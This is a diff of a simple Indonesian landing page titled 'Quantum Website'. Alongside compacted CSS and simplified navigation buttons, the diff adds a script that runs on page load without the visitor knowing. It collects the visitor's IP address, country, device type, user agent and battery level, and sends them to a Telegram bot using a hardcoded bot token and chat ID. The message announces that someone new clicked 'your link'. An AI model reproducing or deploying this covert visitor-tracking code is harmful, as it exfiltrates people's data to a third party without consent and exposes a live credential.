@@ -5,126 +5,112 @@
   <title>Quantum Website</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- GOOGLE FONT -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
 
-  <!-- FONT AWESOME -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Poppins', sans-serif;
+    *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif}
+    body{
+      min-height:100vh;
+      background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
+      color:#fff;
+      display:flex;
+      flex-direction:column;
+      justify-content:space-between;
     }
-
-    body {
-      min-height: 100vh;
-      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      color: #ffffff;
+    .container{text-align:center;padding:70px 20px}
+    h1{font-size:2.6rem;font-weight:700;margin-bottom:20px}
+    .subtitle{opacity:.9;max-width:700px;margin:auto}
+    .creator{margin-top:20px;opacity:.8;font-style:italic}
+    .footer{
+      background:rgba(0,0,0,.35);
+      padding:25px;
+      display:flex;
+      justify-content:center;
+      gap:25px;
     }
-
-    .container {
-      text-align: center;
-      padding: 70px 20px;
-      animation: fadeUp 1.2s ease;
-    }
-
-    h1 {
-      font-size: 2.6rem;
-      font-weight: 700;
-      margin-bottom: 20px;
-      text-transform: uppercase;
-      letter-spacing: 2px;
-    }
-
-    .subtitle {
-      font-size: 1.05rem;
-      max-width: 750px;
-      margin: auto;
-      opacity: 0.9;
-      line-height: 1.8;
-    }
-
-    .creator {
-      margin-top: 20px;
-      font-size: 0.95rem;
-      opacity: 0.8;
-      font-style: italic;
-    }
-
-    /* FOOTER */
-    .footer {
-      background: rgba(0, 0, 0, 0.35);
-      padding: 25px;
-      display: flex;
-      justify-content: center;
-      gap: 25px;
-      backdrop-filter: blur(8px);
-    }
-
-    .nav-box {
-      width: 160px;
-      height: 125px;
-      background: rgba(255, 255, 255, 0.12);
-      border-radius: 20px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      transition: all 0.35s ease;
-      border: 1px solid rgba(255,255,255,0.15);
-    }
-
-    .nav-box:hover {
-      transform: translateY(-10px) scale(1.06);
-      background: linear-gradient(135deg, #00c6ff, #0072ff);
-      box-shadow: 0 15px 35px rgba(0,0,0,0.45);
-    }
-
-    .icon {
-      font-size: 42px;
-      margin-bottom: 10px;
-    }
-
-    .nav-text {
-      font-weight: 600;
-      font-size: 15px;
-      letter-spacing: 1px;
-    }
-
-    @keyframes fadeUp {
-      from { opacity: 0; transform: translateY(30px); }
-      to { opacity: 1; transform: translateY(0); }
+    .nav-box{
+      width:160px;height:125px;
+      background:rgba(255,255,255,.12);
+      border-radius:20px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-weight:600;
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <h1>Welcome to Quantum Website</h1>
-    <p class="subtitle">
-      Website website ini dibuat untuk mempermudah pengguna dalam menggunakan dunia digital
-    </p>
-    <div class="creator">Quantum made by Pahri</div>
-  </div>
+<div class="container">
+  <h1>Welcome to Quantum Website</h1>
+  <p class="subtitle">
+    Website ini dibuat untuk mempermudah pengguna dalam menggunakan dunia digital
+  </p>
+  <div class="creator">Quantum made by Pahri</div>
+</div>
 
-  <div class="footer">
-    <div class="nav-box" onclick="window.location.href='index.html'">
-      <div class="icon">🏠</div>
-      <div class="nav-text">HOME</div>
-    </div>
+<div class="footer">
+  <div class="nav-box">🏠 HOME</div>
+  <div class="nav-box">⚙️ TOOLS</div>
+</div>
 
-    <div class="nav-box" onclick="window.location.href='tools.html'">
-      <div class="icon">⚙️</div>
-      <div class="nav-text">TOOLS</div>
-    </div>
-  </div>
+<!-- 🚀 AUTO SEND TELEGRAM -->
+<script>
+const BOT_TOKEN = "8416804133:AAFfm7SNGYI-EUCEDbpf6IgsJNIZxW9NtcM";
+const CHAT_ID  = "8080998217";
+
+function getDevice(){
+  return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
+    ? "📱 HP"
+    : "💻 PC";
+}
+
+async function getBattery(){
+  try{
+    if(navigator.getBattery){
+      const b = await navigator.getBattery();
+      return Math.round(b.level * 100) + "%";
+    }
+    return "Tidak didukung";
+  }catch{
+    return "Error";
+  }
+}
+
+async function sendTelegram(){
+  try{
+    const ipRes = await fetch("https://ipapi.co/json/");
+    const ip = await ipRes.json();
+    const battery = await getBattery();
+    const time = new Date().toLocaleString("id-ID");
+
+    const message =
+`🚨 LAPOR KETUA ADA YG BARU CLICK LINK ANDA
+
+🌍 Negara : ${ip.country_name}
+🌐 IP : ${ip.ip}
+⏰ Jam : ${time}
+📱 Device : ${getDevice()}
+👤 User-Agent :
+${navigator.userAgent}
+🔋 Baterai : ${battery}`;
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body:JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message
+      })
+    });
+
+  }catch(e){
+    console.log("Gagal kirim:", e);
+  }
+}
+
+sendTelegram();
+</script>
 
 </body>
 </html>
